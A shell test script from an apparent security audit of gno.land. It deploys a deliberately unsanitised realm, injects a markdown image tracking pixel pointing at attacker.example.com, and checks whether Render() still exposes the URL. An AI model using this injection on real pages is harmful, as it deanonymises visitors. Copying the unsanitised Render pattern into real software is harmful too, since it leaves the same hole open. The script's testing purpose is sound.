#!/bin/sh
# Targets: gnolang/gno#5714 — markdown injection in Render()
# PR #5714 MERGED (2026-05-28): p/nt/markdown/sanitize/v0 library now available.
# Vector: external image tracking pixel (deanonymization + SSRF)
# This test realm deliberately omits sanitize.ImageURL() to document the risk.
# Without it, gnoweb renders <img src="https://attacker.com/..."> on every page view.
# Realm authors must call sanitize.ImageURL() on any user-supplied image src.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=common.sh
. "$SCRIPT_DIR/common.sh"

SUFFIX=$(date +%s)
PKGPATH="gno.land/r/${NAMESPACE}/audit/mdimage${SUFFIX}"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

echo "⚠️  gnolang/gno#5714 — External image tracking pixel"
echo "   Package: $PKGPATH"

# --- deploy vulnerable realm ---
cat > "$TMPDIR/mdimage.gno" << EOF
package mdimage

var content string

func SetContent(cur realm, c string) {
	content = c
}

func Render(_ string) string {
	return content
}
EOF

cat > "$TMPDIR/gnomod.toml" << EOF
module = "${PKGPATH}"
gno = "0.9"
EOF

echo -n "   Deploying realm... "
DEPLOY=$(echo "$PASSWORD" | gnokey maketx addpkg \
	-pkgpath "$PKGPATH" -pkgdir "$TMPDIR" \
	-gas-fee 1000000ugnot -gas-wanted 20000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$DEPLOY" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$DEPLOY"; exit 1
fi

# --- inject tracking pixel ---
# The image URL is an external domain. Gnoweb renders <img src="...">,
# which triggers a browser request to attacker.example.com on every page view.
PAYLOAD=$(printf 'Official proposal content.\n\n![](https://attacker.example.com/track.png?realm=%s)' "$PKGPATH")
echo -n "   Injecting tracking pixel... "
INJECT=$(echo "$PASSWORD" | gnokey maketx call \
	-pkgpath "$PKGPATH" \
	-func "SetContent" \
	-args "$PAYLOAD" \
	-gas-fee 1000000ugnot -gas-wanted 5000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$INJECT" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$INJECT"; exit 1
fi

# --- verify: does Render() expose the external image URL? ---
echo -n "   Querying Render() (expect external image URL present)... "
RESULT=$(gnokey query "vm/qeval" \
	-data "${PKGPATH}.Render(\"\")" \
	-remote "$RPC" 2>&1)

if echo "$RESULT" | grep -q "attacker.example.com"; then
	echo "⚠️  VULNERABLE — external image URL present in Render() (expected on master)"
	echo "   Every gnoweb visitor's browser will load the tracking URL"
	echo "   Reference: https://github.com/gnolang/gno/pull/5714"
	exit 1
elif echo "$RESULT" | grep -q "Official proposal"; then
	echo "✅ PATCHED — external image URL stripped or blocked"
else
	echo "⚠️  UNKNOWN OUTPUT"; echo "$RESULT"; exit 1
fi
